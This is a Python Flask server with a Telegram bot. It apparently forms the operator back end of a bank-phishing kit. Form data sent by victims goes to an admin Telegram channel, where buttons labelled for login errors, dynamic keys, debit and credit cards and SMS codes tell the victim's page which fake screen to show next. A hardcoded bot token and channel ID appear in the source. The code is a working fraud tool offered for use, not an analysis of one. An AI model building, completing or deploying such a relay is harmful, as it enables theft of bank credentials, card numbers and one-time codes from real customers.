import os
import threading
import logging
import traceback
from flask import Flask, request, jsonify
from flask_cors import CORS
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)

TOKEN = os.environ.get("BOT_TOKEN", "8371195355:AAFa7xJjZJeO9JxlbgEE0eHXB3vPa8fHMo0")
CANAL_ADMIN_ID = int(os.environ.get("CANAL_ADMIN_ID", "-1003904819480"))

app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app, resources={r"/*": {"origins": "*"}})

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# Diccionario en memoria para almacenar estados por usuario
user_states = {}

def crear_teclado_admin(user_id):
    """Genera la botonera remota de 10 opciones para Telegram."""
    markup = InlineKeyboardMarkup(row_width=2)
    btn_opt1 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:A:{user_id}")
    btn_opt2 = InlineKeyboardButton("🟡 Dinámica", callback_data=f"admin:B:{user_id}")
    btn_opt3 = InlineKeyboardButton("❌ Error Dinámica", callback_data=f"admin:C:{user_id}")
    btn_opt4 = InlineKeyboardButton("💳 Tarjeta Débito", callback_data=f"admin:D:{user_id}")
    btn_opt5 = InlineKeyboardButton("❌ Error T. Débito", callback_data=f"admin:E:{user_id}")
    btn_opt6 = InlineKeyboardButton("💳 Tarjeta Crédito", callback_data=f"admin:F:{user_id}")
    btn_opt7 = InlineKeyboardButton("❌ Error T. Crédito", callback_data=f"admin:G:{user_id}")
    btn_opt8 = InlineKeyboardButton("📲 SMS", callback_data=f"admin:H:{user_id}")
    btn_opt9 = InlineKeyboardButton("❌ Error SMS", callback_data=f"admin:I:{user_id}")
    btn_opt10 = InlineKeyboardButton("✅ Finalizar", callback_data=f"admin:J:{user_id}")
    
    markup.add(btn_opt1, btn_opt2, btn_opt3, btn_opt4, btn_opt5, btn_opt6, btn_opt7, btn_opt8, btn_opt9, btn_opt10)
    return markup


@app.route('/', methods=['GET'])
def home():
    return app.send_static_file('index.html')


@app.route('/api/formulario', methods=['POST'])
def recibir_web():
    datos = request.json or {}
    user_id = str(datos.get('user_id', '')).strip()

    if not user_id:
        return jsonify({"error": "Falta 'user_id'"}), 400

    user_states[user_id] = "normal"

    nombre = datos.get('nombre', 'Usuario Web')
    mensaje = datos.get('mensaje', 'Sin mensaje')

    texto_canal = (
        f"🟡 <b>NUEVA INFORMACIÓN RECIBIDA</b>\n\n"
        f"👤 <b>Origen:</b> {nombre}\n"
        f"🆔 <b>ID Sesión:</b> <code>{user_id}</code>\n\n"
        f"{mensaje}"
    )

    try:
        bot.send_message(
            chat_id=CANAL_ADMIN_ID,
            text=texto_canal,
            reply_markup=crear_teclado_admin(user_id)
        )
        print(f"✅ Mensaje enviado a Telegram para user_id: {user_id}")
        return jsonify({"status": "OK"}), 200
    except Exception as e:
        print(f"❌ Error enviando a Telegram: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/get_status', methods=['GET'])
def get_status():
    user_id = str(request.args.get('user_id', '')).strip()
    status = user_states.get(user_id, 'normal')
    return jsonify({'user_id': user_id, 'status': status}), 200


@app.route('/update_status', methods=['POST'])
def update_status():
    datos = request.json or {}
    user_id = str(datos.get('user_id', '')).strip()
    status = str(datos.get('status', 'normal')).strip().upper()
    
    if user_id:
        user_states[user_id] = status
        return jsonify({'status': 'OK', 'user_id': user_id, 'new_status': status}), 200
    return jsonify({'error': 'Falta user_id'}), 400


@bot.callback_query_handler(func=lambda call: call.data.startswith('admin:'))
def procesar_respuesta_admin(call):
    try:
        bot.answer_callback_query(call.id, "Procesando respuesta...")

        _, opcion, target_user_id = call.data.split(':')
        target_user_id = str(target_user_id).strip()
        opcion = opcion.strip().upper()
        admin_name = call.from_user.first_name or "Admin"

        # 1. Actualizar el estado en el diccionario global
        user_states[target_user_id] = opcion
        print(f"🔄 ESTADO CAMBIADO: Usuario '{target_user_id}' -> Estado '{opcion}' por {admin_name}")

        # 2. Remover los botones para evitar doble clic
        try:
            bot.edit_message_reply_markup(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=None
            )
        except Exception as e_markup:
            print(f"⚠️ No se pudo quitar el teclado: {e_markup}")

        # 3. Actualizar el texto del mensaje en Telegram
        texto_original = call.message.text or ""
        texto_actualizado = (
            f"{texto_original}\n\n"
            f"------------------------------\n"
            f"🔵 ESTADO SOLICITADO: ({opcion})\n"
            f"✍️ Atendido por: {admin_name}"
        )

        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=texto_actualizado,
                parse_mode=None
            )
        except Exception as e_text:
            print(f"⚠️ No se pudo editar el texto: {e_text}")

    except Exception as e:
        print("❌ Error crítico en procesar_respuesta_admin:")
        traceback.print_exc()


def iniciar_bot():
    try:
        bot.remove_webhook()
        print("🤖 Bot de Telegram escuchando con infinity_polling...")
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"❌ Error en el loop del bot: {e}")


# Iniciar el bot en un hilo secundario
threading.Thread(target=iniciar_bot, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
